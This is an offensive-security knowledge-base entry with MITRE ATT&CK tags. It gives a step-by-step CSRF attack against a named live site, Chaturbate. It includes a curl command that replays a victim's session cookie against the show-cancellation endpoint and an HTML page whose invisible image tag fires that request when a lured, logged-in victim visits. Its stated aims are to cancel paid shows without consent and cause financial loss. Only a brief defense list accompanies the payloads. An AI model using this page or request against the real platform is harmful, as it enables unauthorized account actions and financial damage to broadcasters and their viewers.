---
id: proc-uuid-2
tags:
  - csrf
  - bypass
  - exploit
  - web
  - chaturbate
type: procedure
tools: []
tactics:
  - '[[Impact]]'
commands:
  - '[[commands/curl-get-bypass-cancel]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Valid Accounts]]'
updated_at: '2025-12-14T17:27:29.610Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Impact]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Valid Accounts]]'
---
# Bypass-CSRF-with-GET-Request-to-Cancel-Show

## Summary

This procedure exploits a CSRF vulnerability in Chaturbate by sending a GET request to the show cancellation endpoint, which lacks CSRF validation unlike POST requests, allowing an attacker to disrupt a victim's paid show via a malicious link.

## Description

Once the endpoint is identified, craft a malicious webpage that loads a GET request to `/tipping/group_show_cancel/{broadcaster_username}/` using an invisible element like an image tag. When a logged-in victim visits the page, their session cookie authenticates the request, canceling the show without consent. This targets authenticated users in ongoing group or private shows, leading to financial loss and disruption. Prerequisites include victim authentication and social engineering to lure them to the page.

## Requirements

1. Victim's session details (e.g., via shared link, but request uses their cookie automatically)
2. Hosted malicious HTML page accessible via HTTPS
3. Knowledge of the target broadcaster's username

## Defense

Defensive measures and detection strategies:

- Enforce CSRF tokens on all methods (GET, POST) for state-changing endpoints
- Redirect or block GET requests to sensitive actions
- Log and alert on unexpected cancellations tied to GET requests

## Objectives

1. Trigger unauthorized show cancellation on behalf of the victim
2. Demonstrate CSRF bypass effectiveness
3. Disrupt paid interactions without direct access

## Instructions

### Step 1: Craft Malicious Request

**Context**: Prepare a GET request to the endpoint, simulating what the malicious page will trigger.

**Command** ([[commands/curl-get-bypass-cancel]]):
```bash
curl -X GET -H "Cookie: auth_token=victim_session_cookie" https://chaturbate.com/tipping/group_show_cancel/broadcaster_username/
```

> This sends a GET request using the victim's session. If unprotected, the server processes it as a cancellation without CSRF check, returning a success response or redirect.

### Step 2: Deploy Malicious Page

**Context**: Host an HTML page that auto-executes the GET request upon load.

Example HTML:
```html
<!DOCTYPE html><html><body><img src="https://chaturbate.com/tipping/group_show_cancel/broadcaster_username/" onerror="console.log('Bypass attempted')"></body></html>
```

> Serve this page and trick the victim into visiting it while in a show. The img src triggers the GET.

## MITRE ATT&CK Mapping

### Tactics

- [[Impact]] Impact

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application
- [[Valid Accounts]] Valid Accounts

### Sub-Techniques


## Commands Used

- [[commands/curl-get-bypass-cancel]]

## Tools Used


## Tags

- [[csrf]]
- [[bypass]]
- [[exploit]]
